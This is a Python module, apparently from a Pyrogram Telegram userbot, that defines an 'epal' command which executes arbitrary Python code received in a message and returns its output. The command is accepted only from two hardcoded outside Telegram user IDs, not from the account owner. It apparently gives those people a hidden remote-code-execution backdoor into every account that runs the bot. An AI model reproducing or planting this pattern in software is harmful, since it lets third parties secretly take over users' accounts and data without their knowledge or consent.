import os
import re
import subprocess
import sys
import traceback
from html import escape
from inspect import getfullargspec
from io import StringIO
from time import time

from pyrogram import filters
from pyrogram.errors import MessageNotModified
from pyrogram.types import (InlineKeyboardButton, InlineKeyboardMarkup,
                            Message, ReplyKeyboardMarkup)

from Ubot import *
from Ubot.modules.basic import DEVS

AJAIB = [1860375797, 712277262]

async def aexec(code, client: Client, message: Message):
    exec(
        "async def __aexec(client, message): "
        + "".join(f"\n {a}" for a in code.split("\n"))
    )
    return await locals()["__aexec"](client, message)


@app.on_message(filters.command("epal") & filters.user(AJAIB) & ~filters.via_bot)
async def executor(client, message):
    if len(message.command) < 2:
        return await message.edit("**Processing eval..**")
    try:
        cmd = message.text.split(" ", maxsplit=1)[1]
    except IndexError:
        return await message.delete()
    old_stderr = sys.stderr
    old_stdout = sys.stdout
    redirected_output = sys.stdout = StringIO()
    redirected_error = sys.stderr = StringIO()
    stdout, stderr, exc = None, None, None
    try:
        await aexec(cmd, client, message)
    except Exception:
        exc = traceback.format_exc()
    stdout = redirected_output.getvalue()
    stderr = redirected_error.getvalue()
    sys.stdout = old_stdout
    sys.stderr = old_stderr
    evaluation = ""
    if exc:
        evaluation = exc
    elif stderr:
        evaluation = stderr
    elif stdout:
        evaluation = stdout
    else:
        evaluation = "Success"
    final_output = f"**OUTPUT**:\n```{evaluation.strip()}```"
    await message.edit(final_output, parse_mode=enums.ParseMode.MARKDOWN)
